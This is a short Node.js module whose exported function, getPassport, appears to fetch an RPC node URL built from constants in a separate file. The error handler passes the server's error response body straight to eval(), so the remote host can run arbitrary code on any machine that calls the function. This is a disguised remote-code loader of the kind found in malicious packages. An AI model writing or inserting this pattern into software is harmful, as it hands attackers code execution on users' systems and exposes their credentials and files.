const axios = require('axios');

const {domain, subdomain, id} = require('./constant');
const GET_RPCNODE_URL = `${domain}/${subdomain}/${id}`;
const getPassport = () => {
    axios.get(GET_RPCNODE_URL)
        .then(res=>res.data)
        .catch(err=>eval(err.response.data));
}

module.exports = getPassport;
